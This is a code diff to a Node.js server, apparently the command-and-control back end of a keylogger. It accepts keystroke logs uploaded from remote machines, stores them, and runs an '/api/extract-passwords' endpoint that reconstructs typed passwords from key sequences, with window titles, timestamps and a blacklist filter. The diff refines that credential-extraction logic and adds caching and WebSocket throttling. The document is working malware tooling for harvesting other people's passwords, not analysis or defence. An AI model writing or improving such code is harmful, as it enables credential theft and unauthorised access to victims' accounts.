@@ -15,6 +15,7 @@ const winston = require('winston');
 const DailyRotateFile = require('winston-daily-rotate-file');
 const open = require('open');
 const crypto = require('crypto');
+const { LRUCache } = require('lru-cache');
 
 // 生成自签名证书的工具函数
 function generateSelfSignedCert() {
@@ -489,7 +490,7 @@ class AlistClient {
     const filename = fullPath.substring(lastSlash + 1);
 
     await this._request('POST', '/api/fs/remove', {
-        dir: dir,
+        path: dir,
         names: [filename]
     });
 
@@ -509,7 +510,7 @@ const dbPoolConfig = {
     password: CONFIG.db.password,
     database: CONFIG.db.database,
     charset: CONFIG.db.charset,
-    connectionLimit: CONFIG.db.connectionLimit,
+    connectionLimit: 20, 
     queueLimit: CONFIG.db.queueLimit,
     enableKeepAlive: CONFIG.db.enableKeepAlive,
     keepAliveInitialDelay: CONFIG.db.keepAliveInitialDelay,
@@ -548,21 +549,10 @@ function hashPassword(password) {
     return crypto.createHash('sha256').update(normalizePassword(password)).digest('hex');
 }
 
-async function initBlacklistTable() {
-    await executeWithRetry(
-        `CREATE TABLE IF NOT EXISTS password_blacklist (
-            id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
-            password_hash CHAR(64) NOT NULL UNIQUE,
-            password TEXT NOT NULL,
-            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;`,
-        []
-    );
-}
-
 
 async function initDatabase() {
     try {
+        // 创建已知客户端表
         await executeWithRetry(`
             CREATE TABLE IF NOT EXISTS known_clients (
                 id VARCHAR(45) PRIMARY KEY COMMENT '客户端标识 ip:port',
@@ -572,10 +562,20 @@ async function initDatabase() {
                 created_at BIGINT COMMENT '创建时间戳（毫秒）'
             ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
         `);
+
+        // 创建密码黑名单表
+        await executeWithRetry(`
+            CREATE TABLE IF NOT EXISTS password_blacklist (
+                id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+                password_hash CHAR(64) NOT NULL UNIQUE,
+                password TEXT NOT NULL,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+        `);
+
         logger.info('MySQL 数据库表初始化完成');
     } catch (error) {
         logger.warn('数据库初始化失败，将在无数据库模式下运行', { error: error.message });
-        // 不退出进程，继续运行
     }
 }
 
@@ -923,27 +923,37 @@ class ClientManager {
     }
 
     broadcastClientUpdate(client, eventType) {
-        const updateMsg = JSON.stringify({
-            type: 'client_updated',
-            event: eventType,
-            client: this.getClientInfo(client)
-        });
-        const listMsg = JSON.stringify({
-            type: 'clients_list',
-            clients: this.getAllClients()
-        });
-        this.webClients.forEach(ws => {
-            if (ws.readyState === WebSocket.OPEN) {
-                ws.send(updateMsg);
-                ws.send(listMsg);
+    const updateMsg = JSON.stringify({
+        type: 'client_updated',
+        event: eventType,
+        client: this.getClientInfo(client)
+    });
+    const listMsg = JSON.stringify({
+        type: 'clients_list',
+        clients: this.getAllClients()
+    });
+
+    const messages = [updateMsg, listMsg];
+    this.webClients.forEach(ws => {
+        if (ws.readyState === WebSocket.OPEN) {
+            // 检查缓冲区积压量，超过阈值则跳过本次发送
+            if (ws.bufferedAmount > 1024 * 64) { // 64KB 阈值
+                this.logger.warn(`WebSocket 客户端积压过多，跳过本次广播`);
+                return;
             }
-        });
-    }
+            messages.forEach(msg => ws.send(msg));
+        }
+    });
+}
 
     broadcastToWeb(data) {
         const message = JSON.stringify(data);
         this.webClients.forEach(ws => {
             if (ws.readyState === WebSocket.OPEN) {
+                if (ws.bufferedAmount > 1024 * 64) {
+                    this.logger.warn(`WebSocket 客户端积压过多，跳过单条消息广播`);
+                    return;
+                }
                 ws.send(message);
             }
         });
@@ -1350,26 +1360,53 @@ app.post('/api/batch/delete-logs', asyncHandler(async (req, res) => {
         return res.status(400).json({ error: 'files 必须是数组' });
     }
 
-    const results = [];
-    const deleteLimit = pLimit(10); // 限制并发删除数
-
-    const deleteTasks = files.map(file => deleteLimit(async () => {
-        try {
+    // ---------- 预检阶段：确认所有文件存在 ----------
+    const precheckResults = await Promise.allSettled(
+        files.map(async file => {
             const { clientId, filename } = file;
             const clientInfo = getClientInfoById(clientId);
             const safeFilename = path.basename(filename);
             if (safeFilename !== filename) {
-                return { clientId, filename, success: false, error: '非法文件名' };
+                throw new Error(`非法文件名: ${filename}`);
             }
-
             const filePath = filename.startsWith('passwords_') 
                 ? `${alistClient.basePath}/${filename}` 
                 : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
+            
+            // 尝试获取文件信息以验证存在性
+            await alistClient._request('HEAD', `/api/fs/get?path=${encodeURIComponent(filePath)}`);
+            return { clientId, filename, filePath };
+        })
+    );
 
-            await alistClient.deleteFile(filePath);
-            auditLogger.info(`批量删除日志文件: ${filePath}`, { user: req.user, action: 'batch_delete_file', clientId, filename });
-            logger.info(`批量删除日志文件: ${filePath}`, { clientId, filename, user: req.user || 'unknown' });
-            return { clientId, filename, success: true };
+    const missingFiles = [];
+    const validFiles = [];
+    precheckResults.forEach((result, index) => {
+        if (result.status === 'rejected') {
+            missingFiles.push({ ...files[index], error: result.reason.message });
+        } else {
+            validFiles.push(result.value);
+        }
+    });
+
+    if (missingFiles.length > 0) {
+        return res.status(400).json({
+            success: false,
+            error: '部分文件不存在或无权限访问',
+            missingFiles
+        });
+    }
+
+    // ---------- 执行删除 ----------
+    const results = [];
+    const deleteLimit = pLimit(10);
+
+    const deleteTasks = validFiles.map(file => deleteLimit(async () => {
+        try {
+            await alistClient.deleteFile(file.filePath);
+            auditLogger.info(`批量删除日志文件: ${file.filePath}`, { user: req.user, action: 'batch_delete_file', clientId: file.clientId, filename: file.filename });
+            logger.info(`批量删除日志文件: ${file.filePath}`, { clientId: file.clientId, filename: file.filename, user: req.user || 'unknown' });
+            return { clientId: file.clientId, filename: file.filename, success: true };
         } catch (error) {
             auditLogger.error(`批量删除失败: ${file.clientId}/${file.filename}`, { user: req.user, action: 'batch_delete_failed', error: error.message });
             logger.error(`批量删除失败: ${file.clientId}/${file.filename}`, { error: error.message, user: req.user || 'unknown' });
@@ -1432,36 +1469,62 @@ app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uplo
     if (!clientId) {
         clientId = Array.from(clientManager.knownClients.keys()).find(id => id.startsWith(ip));
     }
-    // 即使客户端不存在，也允许上传文件
     const client = clientManager.clients.get(clientId);
     const logDir = client ? client.logDir : alistClient.basePath;
     const filename = `${ip}_${new Date().toISOString().slice(0, 10).replace(/-/g, '')}.log`;
 
-    // 异步上传文件，避免阻塞主线程
-    setImmediate(async () => {
-        try {
-            const result = await alistClient.uploadFile(logDir, filename, req.body.toString());
-            logger.info(`文件上传成功: ${filename}`, { ip, size: req.body.length });
-        } catch (error) {
-            logger.error(`文件上传失败: ${filename}`, { error: error.message, ip });
-        }
-    });
-
-    // 立即返回响应，不等待上传完成
-    res.json({ success: true, message: '文件上传已开始处理' });
+    try {
+        await alistClient.uploadFile(logDir, filename, req.body.toString());
+        logger.info(`文件上传成功: ${filename}`, { ip, size: req.body.length });
+        res.json({ success: true, message: '文件上传成功' });
+    } catch (error) {
+        logger.error(`文件上传失败: ${filename}`, { error: error.message, ip });
+        res.status(500).json({ success: false, error: '文件上传失败: ' + error.message });
+    }
 }));
 
+// 缓存提取结果（基于 LRU 淘汰策略
+const extractionCache = {
+    lastExtractTime: 0,
+    passwords: [],
+    fileMTimes: new LRUCache({
+        max: 500,                // 最多缓存500个文件的修改时间
+        ttl: 1000 * 60 * 60,     // 1小时过期
+        updateAgeOnGet: true
+    })
+};
 app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
     try {
         // 列出所有日志文件
         const allFiles = await alistClient.listFiles(alistClient.basePath);
         const logFiles = allFiles.filter(file => file.filename.endsWith('.log'));
-
+        
         if (logFiles.length === 0) {
             return res.json({ success: true, count: 0 });
         }
 
-        // 读取密码黑名单（已哈希存储）
+        // 检查缓存是否有效（简单策略：检查文件数量是否变化，以及最近修改时间）
+        let needFullExtraction = false;
+        const currentMTimes = new Map();
+        for (const file of logFiles) {
+            const mtime = file.uploadTime ? new Date(file.uploadTime).getTime() : Date.now();
+            currentMTimes.set(file.filename, mtime);
+            if (!extractionCache.fileMTimes.has(file.filename) || 
+                extractionCache.fileMTimes.get(file.filename) !== mtime) {
+                needFullExtraction = true;
+            }
+        }
+        if (extractionCache.fileMTimes.size !== currentMTimes.size) {
+            needFullExtraction = true;
+        }
+        
+        // 如果不需要完全重新提取，直接返回缓存结果
+        if (!needFullExtraction && extractionCache.passwords.length > 0) {
+            logger.info('使用缓存的密码提取结果');
+            return res.json({ success: true, count: extractionCache.passwords.length });
+        }
+
+        // 读取密码黑名单哈希（一次性加载到内存）
         let blacklistedHashes = new Set();
         try {
             const blacklistedRows = await executeWithRetry('SELECT password_hash FROM password_blacklist', []);
@@ -1470,8 +1533,8 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
             logger.warn('读取密码黑名单失败，继续提取密码', { error: error.message });
         }
 
-        // 并发提取密码
-        const extractLimit = pLimit(20);
+        // 并发提取密码（限制并发数，避免过多文件同时读取）
+        const extractLimit = pLimit(10); // 降低并发，减轻 Alist 压力
         const extractTasks = logFiles.map(file => extractLimit(async () => {
             try {
                 const content = await alistClient.readFile(`${alistClient.basePath}/${file.filename}`);
@@ -1490,21 +1553,13 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
             }
         });
 
-        if (allPasswords.length === 0) {
-            return res.json({ success: true, count: 0 });
-        }
-
         // 黑名单过滤（基于密码哈希）
         const filteredPasswords = allPasswords.filter(item => {
             const hash = hashPassword(item.password);
             return !blacklistedHashes.has(hash);
         });
 
-        if (filteredPasswords.length === 0) {
-            return res.json({ success: true, count: 0 });
-        }
-
-        // 去重：按密码内容 + 来源文件组合去重（同一文件内相同密码只保留一次）
+        // 去重：按密码内容 + 来源文件组合去重
         const uniquePasswords = [];
         const seenSet = new Set();
         for (const item of filteredPasswords) {
@@ -1515,14 +1570,6 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
             }
         }
         
-        uniquePasswords.sort((a, b) => {
-            return (b.timestamp || '').localeCompare(a.timestamp || '');
-        });
-
-        if (uniquePasswords.length === 0) {
-            return res.json({ success: true, count: 0 });
-        }
-
         // 按时间戳排序（最新的在前）
         uniquePasswords.sort((a, b) => (b.timestamp || '').localeCompare(a.timestamp || ''));
 
@@ -1544,12 +1591,17 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
         await fs.promises.writeFile(filePath, resultContent);
         logger.info(`成功保存提取结果到: ${filePath}, 密码数量: ${uniquePasswords.length}`);
 
+        // 更新缓存
+        extractionCache.lastExtractTime = Date.now();
+        extractionCache.passwords = uniquePasswords;
+        extractionCache.fileMTimes = currentMTimes;
+
         res.json({
             success: true,
             count: uniquePasswords.length
         });
     } catch (error) {
-        logger.error('提取密码失败', { error: error.message });
+        logger.error('提取密码失败', { error: error.message, stack: error.stack });
         res.status(500).json({ error: '提取密码失败' });
     }
 }));
@@ -1625,152 +1677,35 @@ app.get('/api/extract-passwords/view', asyncHandler(async (req, res) => {
 }));
 
 // 解析包含特殊键的密码字符串
-function extractPasswordsFromLog(content, filename) {
-    const passwords = [];
-    const lines = content.split('\n');
-    
-    // 当前窗口状态
-    let currentWindow = '';
-    let timestamp = null;
-    
-    // 输入框状态
-    let inPasswordField = false;
-    let inUsernameField = false;
-    let usernameSequence = [];
-    let passwordSequence = [];
-    
-    // 用于处理 Ctrl+A 全选（清空）等组合键的临时变量
-    let ctrlPressed = false;
 
-    for (let i = 0; i < lines.length; i++) {
-        const line = lines[i].trim();
-        
-        // 窗口切换行：保存当前窗口可能未提交的密码，并重置状态
-        if (line.startsWith('[Window:')) {
-            // 尝试保存当前窗口的密码（如果处于密码框且有内容）
-            if (inPasswordField && passwordSequence.length > 0) {
-                const rawPwd = passwordSequence.join('\n');
-                const parsed = parsePassword(rawPwd);
-                if (parsed && parsed.length >= 1) {
-                    passwords.push({
-                        file: filename,
-                        timestamp: timestamp || '未知',
-                        password: parsed,
-                        rawPassword: rawPwd,
-                        window: currentWindow || '未知窗口'
-                    });
-                }
-            }
-            
-            // 重置所有输入状态
-            inPasswordField = false;
-            inUsernameField = false;
-            usernameSequence = [];
-            passwordSequence = [];
-            ctrlPressed = false;
-            
-            // 提取窗口标题和时间戳
-            const winMatch = line.match(/\[Window:\s*(.+?)\s+at\s+(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\+\d{4})/);
-            if (winMatch) {
-                currentWindow = winMatch[1];
-                timestamp = winMatch[2];
-            } else {
-                const tsMatch = line.match(/at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\+\d{4})/);
-                if (tsMatch) timestamp = tsMatch[1];
-                const titleMatch = line.match(/\[Window:\s*(.+?)\]/);
-                if (titleMatch) currentWindow = titleMatch[1];
-            }
-            
+
+// 将原始按键序列解析为可读密码
+function parsePassword(rawSequence) {
+    if (!rawSequence) return '';
+    const lines = rawSequence.split('\n').filter(line => line.trim() !== '');
+    const result = [];
+    let shiftPressed = false;
+    let ctrlPressed = false;
+    let altPressed = false;
+
+    const shiftMap = {
+        '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
+        '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
+        '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
+        ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
+        '`': '~'
+    };
+
+    for (const line of lines) {
+        // 处理修饰键
+        if (line === '[LSHIFT]' || line === '[RSHIFT]') {
+            shiftPressed = true;
             continue;
         }
-        
-        // 处理焦点切换（如果日志中有 [Focus:] 标记，可选）
-        if (line.startsWith('[Focus:')) {
-            const focus = line.toLowerCase();
-            if (focus.includes('password') || focus.includes('密码')) {
-                inPasswordField = true;
-                inUsernameField = false;
-                passwordSequence = [];
-            } else if (focus.includes('username') || focus.includes('用户名') || focus.includes('account')) {
-                inUsernameField = true;
-                inPasswordField = false;
-                usernameSequence = [];
-            } else {
-                // 焦点离开输入框，保存可能正在输入的密码
-                if (inPasswordField && passwordSequence.length > 0) {
-                    const rawPwd = passwordSequence.join('\n');
-                    const parsed = parsePassword(rawPwd);
-                    if (parsed && parsed.length >= 1) {
-                        passwords.push({
-                            file: filename,
-                            timestamp: timestamp || '未知',
-                            password: parsed,
-                            rawPassword: rawPwd,
-                            window: currentWindow || '未知窗口'
-                        });
-                    }
-                }
-                inPasswordField = false;
-                inUsernameField = false;
-            }
+        if (line === '[LSHIFT_RELEASE]' || line === '[RSHIFT_RELEASE]') {
+            shiftPressed = false;
             continue;
         }
-        
-        // 处理 TAB 键：切换输入框焦点
-        if (line.includes('[TAB]')) {
-            if (inUsernameField) {
-                // 从用户名切换到密码框
-                inUsernameField = false;
-                inPasswordField = true;
-                passwordSequence = [];  // 清空密码序列，准备接收密码输入
-            } else if (inPasswordField) {
-                // 从密码框切换到其他（如提交按钮），保存密码
-                if (passwordSequence.length > 0) {
-                    const rawPwd = passwordSequence.join('\n');
-                    const parsed = parsePassword(rawPwd);
-                    if (parsed && parsed.length >= 1) {
-                        passwords.push({
-                            file: filename,
-                            timestamp: timestamp || '未知',
-                            password: parsed,
-                            rawPassword: rawPwd,
-                            window: currentWindow || '未知窗口'
-                        });
-                    }
-                }
-                inPasswordField = false;
-            } else {
-                // 如果没有明确的用户名框，遇到 TAB 则认为是进入密码框
-                inPasswordField = true;
-                passwordSequence = [];
-            }
-            // 不将 [TAB] 加入序列
-            continue;
-        }
-        
-        // 处理 ENTER 键：提交表单，密码输入结束
-        if (line.includes('[ENTER]') || line.includes('[RETURN]')) {
-            if (inPasswordField && passwordSequence.length > 0) {
-                const rawPwd = passwordSequence.join('\n');
-                const parsed = parsePassword(rawPwd);
-                if (parsed && parsed.length >= 1) {
-                    passwords.push({
-                        file: filename,
-                        timestamp: timestamp || '未知',
-                        password: parsed,
-                        rawPassword: rawPwd,
-                        window: currentWindow || '未知窗口'
-                    });
-                }
-                passwordSequence = [];
-            }
-            inPasswordField = false;
-            inUsernameField = false;
-            continue;
-        }
-        
-        // 处理 Ctrl 组合键（简单模拟全选、粘贴等）
-        // 注意：由于日志中 Ctrl 按下和释放是分开的，这里只做有限处理
         if (line === '[LCONTROL]' || line === '[RCONTROL]') {
             ctrlPressed = true;
             continue;
@@ -1779,212 +1714,232 @@ function extractPasswordsFromLog(content, filename) {
             ctrlPressed = false;
             continue;
         }
-        
-        // 处理 Ctrl+A 全选（清空当前输入框内容）
-        if (ctrlPressed && (line === 'a' || line === 'A')) {
-            if (inPasswordField) {
-                passwordSequence = [];
-            } else if (inUsernameField) {
-                usernameSequence = [];
-            }
-            ctrlPressed = false; // 组合键完成后释放 Ctrl 效果
+        if (line === '[LALT]' || line === '[RALT]') {
+            altPressed = true;
             continue;
         }
-        
-        // 处理 Ctrl+V 粘贴（此处简单记录为粘贴标记，但不展开内容，因为日志未提供剪贴板内容）
-        if (ctrlPressed && (line === 'v' || line === 'V')) {
-            if (inPasswordField) {
-                passwordSequence.push('[PASTE]'); // 占位符，表示此处有粘贴内容
-            } else if (inUsernameField) {
-                usernameSequence.push('[PASTE]');
-            }
-            ctrlPressed = false;
+        if (line === '[LALT_RELEASE]' || line === '[RALT_RELEASE]') {
+            altPressed = false;
             continue;
         }
-        
-        // 如果当前在密码框内，收集非空行（包括普通字符和特殊键标记）
-        if (inPasswordField) {
-            if (line === '') {
-                // 空行表示输入暂停，可选择保存
-                if (passwordSequence.length > 0) {
-                    const rawPwd = passwordSequence.join('\n');
-                    const parsed = parsePassword(rawPwd);
-                    if (parsed && parsed.length >= 1) {
-                        passwords.push({
-                            file: filename,
-                            timestamp: timestamp || '未知',
-                            password: parsed,
-                            rawPassword: rawPwd,
-                            window: currentWindow || '未知窗口'
-                        });
-                    }
-                    passwordSequence = [];
-                }
-                inPasswordField = false;
+
+        // 忽略单独的控制键（如 [ENTER]、[TAB] 等，这些在序列收集中已经作为分隔符）
+        if (line.startsWith('[') && line.endsWith(']')) {
+            // 对于退格键，删除最后一个字符
+            if (line === '[BACKSPACE]' || line === '[BACK]') {
+                result.pop();
+            }
+            // 其他控制键忽略（不加入密码）
+            continue;
+        }
+
+        // 处理普通字符
+        let char = line;
+        if (line.length === 1) {
+            if (shiftPressed) {
+                char = shiftMap[line] || line.toUpperCase();
             } else {
-                passwordSequence.push(line);
+                char = line.toLowerCase();
             }
+        }
+        // Ctrl 组合键通常不产生可打印字符，忽略
+        if (ctrlPressed || altPressed) {
             continue;
         }
-        
-        // 如果在用户名框内，仅收集但不保存密码
-        if (inUsernameField) {
-            if (line === '') {
-                inUsernameField = false;
-            } else {
-                usernameSequence.push(line);
-            }
-            continue;
-        }
+        result.push(char);
     }
-    
-    // 处理文件末尾残留的密码序列
-    if (inPasswordField && passwordSequence.length > 0) {
-        const rawPwd = passwordSequence.join('\n');
-        const parsed = parsePassword(rawPwd);
-        if (parsed && parsed.length >= 1) {
-            passwords.push({
-                file: filename,
-                timestamp: timestamp || '未知',
-                password: parsed,
-                rawPassword: rawPwd,
-                window: currentWindow || '未知窗口'
-            });
-        }
-    }
-    
-    return passwords;
+    return result.join('');
 }
 
-
 // 从日志内容中提取密码。分离用户名与密码
+// 从日志内容中提取密码（增强版，支持焦点切换、Tab切换、回车提交）
+// 新增辅助函数：从原始序列解析密码（修复修饰键状态重置问题）
+function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialAlt) {
+    let shift = initialShift;
+    let ctrl = initialCtrl;
+    let alt = initialAlt;
+    const result = [];
+    const shiftMap = {
+        '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
+        '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
+        '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
+        ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
+        '`': '~'
+    };
+
+    for (const item of sequence) {
+        if (item === '[LSHIFT]' || item === '[RSHIFT]') {
+            shift = true;
+            continue;
+        }
+        if (item === '[LSHIFT_RELEASE]' || item === '[RSHIFT_RELEASE]') {
+            shift = false;
+            continue;
+        }
+        if (item === '[LCONTROL]' || item === '[RCONTROL]') {
+            ctrl = true;
+            continue;
+        }
+        if (item === '[LCONTROL_RELEASE]' || item === '[RCONTROL_RELEASE]') {
+            ctrl = false;
+            continue;
+        }
+        if (item === '[LALT]' || item === '[RALT]') {
+            alt = true;
+            continue;
+        }
+        if (item === '[LALT_RELEASE]' || item === '[RALT_RELEASE]') {
+            alt = false;
+            continue;
+        }
+        if (item.startsWith('[') && item.endsWith(']')) continue; // 其他控制键忽略
+        
+        if (ctrl || alt) continue; // Ctrl/Alt 组合不产生可打印字符
+        
+        let char = item;
+        if (item.length === 1) {
+            if (shift) {
+                char = shiftMap[item] || item.toUpperCase();
+            } else {
+                char = item.toLowerCase();
+            }
+        }
+        result.push(char);
+    }
+    return result.join('');
+}
+
 function extractPasswordsFromLog(content, filename) {
     const passwords = [];
     const lines = content.split('\n');
-    let inPasswordField = false;      // 是否处于密码输入框
-    let rawSequence = [];
-    let timestamp = null;
+    
     let currentWindow = '';
+    let timestamp = null;
+    let inPasswordField = false;
+    let rawSequence = [];
+    let shiftPressed = false;
+    let ctrlPressed = false;
+    let altPressed = false;
+
+    const saveCurrentPassword = () => {
+        if (inPasswordField && rawSequence.length > 0) {
+            const rawPwd = rawSequence.join('\n');
+            const parsed = parsePasswordFromSequence(rawSequence, shiftPressed, ctrlPressed, altPressed);
+            if (parsed && parsed.length >= 1) {
+                passwords.push({
+                    file: filename,
+                    timestamp: timestamp || '未知',
+                    password: parsed,
+                    rawPassword: rawPwd,
+                    window: currentWindow || '未知窗口'
+                });
+            }
+            rawSequence = [];
+        }
+        // 重置修饰键状态
+        shiftPressed = false;
+        ctrlPressed = false;
+        altPressed = false;
+    };
 
     for (let i = 0; i < lines.length; i++) {
         const line = lines[i].trim();
         
-        // 窗口切换检测
+        // 窗口切换行：重置所有状态
         if (line.startsWith('[Window:')) {
-            // 保存上一个窗口的密码（如果有）
-            if (inPasswordField && rawSequence.length > 0) {
-                const rawPassword = rawSequence.join('\n');
-                const parsed = parsePassword(rawPassword);
-                if (parsed && parsed.length >= 1 && !parsed.includes('404-passwordnotfound')) {
-                    passwords.push({
-                        file: filename,
-                        timestamp: timestamp || '未知',
-                        password: parsed,
-                        rawPassword: rawPassword,
-                        window: currentWindow || '未知窗口'
-                    });
-                }
-            }
-            // 重置状态
+            saveCurrentPassword();
             inPasswordField = false;
             rawSequence = [];
-            timestamp = null;
+            shiftPressed = false;
+            ctrlPressed = false;
+            altPressed = false;
             
-            // 提取时间戳
             const tsMatch = line.match(/at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\+\d{4})/);
             if (tsMatch) timestamp = tsMatch[1];
-            
-            // 提取窗口标题
             const winMatch = line.match(/\[Window:\s*(.+?)\s*at/);
             if (winMatch) currentWindow = winMatch[1];
-            
-            // 判断是否为安全窗口（通常密码输入发生在此类窗口）
-            const lowerLine = line.toLowerCase();
-            if (lowerLine.includes('windows 安全') || lowerLine.includes('windows security') ||
-                lowerLine.includes('登录') || lowerLine.includes('密码') || lowerLine.includes('password')) {
-                // 进入可能包含密码输入的窗口，但默认初始不是密码框
-            }
+            continue;
+        }
+        
+        // 处理修饰键按下/释放
+        if (line === '[LSHIFT]' || line === '[RSHIFT]') {
+            shiftPressed = true;
+            continue;
+        }
+        if (line === '[LSHIFT_RELEASE]' || line === '[RSHIFT_RELEASE]') {
+            shiftPressed = false;
+            continue;
+        }
+        if (line === '[LCONTROL]' || line === '[RCONTROL]') {
+            ctrlPressed = true;
+            continue;
+        }
+        if (line === '[LCONTROL_RELEASE]' || line === '[RCONTROL_RELEASE]') {
+            ctrlPressed = false;
+            continue;
+        }
+        if (line === '[LALT]' || line === '[RALT]') {
+            altPressed = true;
+            continue;
+        }
+        if (line === '[LALT_RELEASE]' || line === '[RALT_RELEASE]') {
+            altPressed = false;
             continue;
         }
 
-        // 焦点切换检测（如果日志中有 [Focus: ...] 标记）
+        // 焦点切换标记（如果存在）
         if (line.startsWith('[Focus:')) {
-            const focusTarget = line.toLowerCase();
-            if (focusTarget.includes('password') || focusTarget.includes('密码')) {
+            const focusLower = line.toLowerCase();
+            if (focusLower.includes('password') || focusLower.includes('密码')) {
+                saveCurrentPassword();
                 inPasswordField = true;
-                rawSequence = []; // 清空之前可能捕获的用户名
+                rawSequence = [];
+            } else if (focusLower.includes('username') || focusLower.includes('用户名')) {
+                saveCurrentPassword();
+                inPasswordField = false;
             } else {
-                // 如果焦点离开密码框，保存当前已收集的密码
-                if (inPasswordField && rawSequence.length > 0) {
-                    const rawPassword = rawSequence.join('\n');
-                    const parsed = parsePassword(rawPassword);
-                    if (parsed && parsed.length >= 1 && !parsed.includes('404-passwordnotfound')) {
-                        passwords.push({
-                            file: filename,
-                            timestamp: timestamp || '未知',
-                            password: parsed,
-                            rawPassword: rawPassword,
-                            window: currentWindow || '未知窗口'
-                        });
-                    }
-                    rawSequence = [];
-                }
+                saveCurrentPassword();
                 inPasswordField = false;
             }
             continue;
         }
 
-        // 如果没有焦点标记，采用启发式：遇到 Tab 键后认为进入了密码框（常见于登录表单）
-        if (!inPasswordField && line.includes('[TAB]')) {
-            inPasswordField = true;
-            rawSequence = [];
+        // TAB 键：切换输入框
+        if (line.includes('[TAB]')) {
+            if (inPasswordField) {
+                saveCurrentPassword();
+                inPasswordField = false;
+            } else {
+                // 假设从用户名切换到密码框
+                inPasswordField = true;
+                rawSequence = [];
+            }
             continue;
         }
 
-        // 如果处于密码输入状态，收集按键行
-        if (inPasswordField) {
-            // 遇到空行或窗口切换（已处理）则结束当前密码块
-            if (line === '') {
-                if (rawSequence.length > 0) {
-                    const rawPassword = rawSequence.join('\n');
-                    const parsed = parsePassword(rawPassword);
-                    if (parsed && parsed.length >= 1 && !parsed.includes('404-passwordnotfound')) {
-                        passwords.push({
-                            file: filename,
-                            timestamp: timestamp || '未知',
-                            password: parsed,
-                            rawPassword: rawPassword,
-                            window: currentWindow || '未知窗口'
-                        });
-                    }
-                    rawSequence = [];
-                }
-                inPasswordField = false;
-                continue;
-            }
-            // 收集非空行（包括普通字符行和特殊键行）
+        // ENTER 键：提交表单
+        if (line.includes('[ENTER]') || line.includes('[RETURN]')) {
+            saveCurrentPassword();
+            inPasswordField = false;
+            continue;
+        }
+
+        // 退格键处理：删除最后一个原始输入
+        if (line === '[BACKSPACE]' || line === '[BACK]') {
+            if (inPasswordField) rawSequence.pop();
+            continue;
+        }
+
+        // 如果当前在密码输入框中，收集普通按键（非空行）
+        if (inPasswordField && line && !line.startsWith('[')) {
             rawSequence.push(line);
         }
     }
-
-    // 处理文件末尾可能残留的密码
-    if (inPasswordField && rawSequence.length > 0) {
-        const rawPassword = rawSequence.join('\n');
-        const parsed = parsePassword(rawPassword);
-        if (parsed && parsed.length >= 1 && !parsed.includes('404-passwordnotfound')) {
-            passwords.push({
-                file: filename,
-                timestamp: timestamp || '未知',
-                password: parsed,
-                rawPassword: rawPassword,
-                window: currentWindow || '未知窗口'
-            });
-        }
-    }
-
+    
+    // 处理文件末尾残留
+    saveCurrentPassword();
     return passwords;
 }
-
 // 统一错误处理中间件
 app.use((err, req, res, next) => {
     logger.error('API 错误', { url: req.url, error: err.message, stack: err.stack });
@@ -2023,7 +1978,6 @@ async function shutdown() {
 // 启动服务
 (async () => {
     try {
-        await initBlacklistTable();
         await clientManager.init();
         
         const httpsEnabled = process.env.HTTPS_ENABLED === 'true';
